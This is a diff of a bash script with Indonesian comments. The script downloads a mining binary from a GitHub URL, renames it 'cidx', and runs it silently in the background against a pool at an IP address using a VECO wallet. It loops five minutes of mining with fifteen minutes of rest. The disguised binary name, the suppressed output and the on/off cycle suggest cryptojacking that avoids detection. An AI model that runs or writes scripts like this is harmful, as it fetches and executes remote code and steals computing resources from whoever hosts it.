@@ -1,39 +1,31 @@
 #!/bin/bash
 
-# Bersihkan proses mining sebelumnya
+echo "[veco1-loop] Dimulai pada $(date)"
+
+# Bersihkan proses sebelumnya
 pkill cidx
 
-# Download binary
+# Download binary mining
 rm -f cidx
 wget -O cidx https://github.com/barburonjilo/back/raw/main/sru >/dev/null 2>&1
 
-# Buat konfigurasi
-cat > config.json <<END
-{
-  "url": "45.115.224.54:443",
-  "user": "VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker1",
-  "pass": "c=VECO,m=solo,zap=VECO,mc=VECO",
-  "threads": 6,
-  "algo": "yespower"
-}
-END
+chmod +x cidx
 
-chmod +x config.json cidx
+# Loop mining 5 menit, istirahat 15 menit
+while true; do
+  echo "[⛏️ START] $(date): Mining aktif 5 menit..."
+  
+  nohup ./cidx -a yespower \
+    -o 45.115.224.203:443 \
+    -u VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker1 \
+    -p c=VECO,m=solo,zap=VECO,mc=VECO \
+    -t 6 &>/dev/null &
 
-# Jalankan selama 5 menit
-nohup ./cidx -a yespower \
-  -o 45.115.224.203:443 \
-  -u VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker1 \
-  -p c=VECO,m=solo,zap=VECO,mc=VECO \
-  -t 6 &>/dev/null &
+  sleep 300   # 5 menit mining
 
-start_time=$(TZ=UTC-7 date +"%R-[%d/%m/%y]")
-echo "[$start_time] STATUS: 🚀 JALAN (5 menit)"
+  echo "[🛑 STOP] $(date): Mining dihentikan sementara."
+  pkill cidx
 
-sleep 300
-
-# Stop setelah 5 menit
-pkill cidx
-
-stop_time=$(TZ=UTC-7 date +"%R-[%d/%m/%y]")
-echo "[$stop_time] STATUS: 🛑 MATI"
+  echo "[⏱ WAIT] Delay 15 menit sebelum jalan ulang..."
+  sleep 900   # 15 menit istirahat
+done
